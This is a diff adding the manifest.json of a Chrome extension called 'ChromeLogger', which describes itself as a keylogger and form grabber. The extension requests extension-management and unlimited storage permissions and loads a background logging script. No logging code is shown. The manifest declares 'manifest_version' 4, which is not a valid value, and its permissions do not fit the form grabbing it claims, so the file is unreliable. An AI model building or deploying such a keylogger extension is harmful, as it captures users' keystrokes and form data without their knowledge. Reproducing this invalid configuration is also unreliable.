@@ -1,0 +1,21 @@
+{
+  "name": "ChromeLogger",
+  "version": "1.0.3",
+  "manifest_version": 4,
+  "description": "A keylogger and form grabber for Google Chrome.",
+  "homepage_url": "http://www.ericzhang.me/projects/chromelogger/",
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
+  "options_page": "src/options/index.html",
+  "background": {
+    "scripts": ["src/check_exts/ext_logger.js"]
+  },
+  "permissions": [
+	"management",
+    "storage",
+    "unlimitedStorage"
+  ]
+}
